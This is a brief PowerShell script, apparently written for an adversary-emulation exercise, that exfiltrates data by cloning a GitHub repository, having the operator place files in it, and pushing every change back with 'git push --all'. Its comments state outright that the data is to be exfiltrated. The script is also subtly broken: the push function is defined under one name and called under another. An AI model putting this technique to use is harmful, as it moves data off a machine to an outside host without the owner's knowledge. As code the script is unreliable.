## var

# add your .git repo url here:
$repo="https://github.com/loza9963/caldera-test.git"
$path=$env:HOMEDRIVE+$env:HOMEPATH
$folder=$repo.split("/")[-1].replace(".git","")
$local=$path+"\"+$folder
Write-Host -ForegroundColor Green "Repo to clone: $repo"
Write-Host -ForegroundColor Green "Local repo directory: $local"


function Git-CloneRepo
{
    Write-Host -ForegroundColor Yellow "Cloning $repo to $local"
    git clone $repo
    Write-Host -ForegroundColor Yellow "Changing working directory to $local"
    cd $local
    ii $local
}

function Get-CommitPush
{
    Write-Host -ForegroundColor Yellow "Commiting and pushing changes to $repo"
    $date = get-date
    git add -A
    git commit -a -m "$env:USERNAME :: $date"
    git push --all
    Write-Host -ForegroundColor Green "Done"
}

## Run this first. When finished file explorer should pop where you can add/modify the file you are going to exfil ;)
Git-CloneRepo

## Run this after adding/modifying the data to exfil
Git-CommitPush
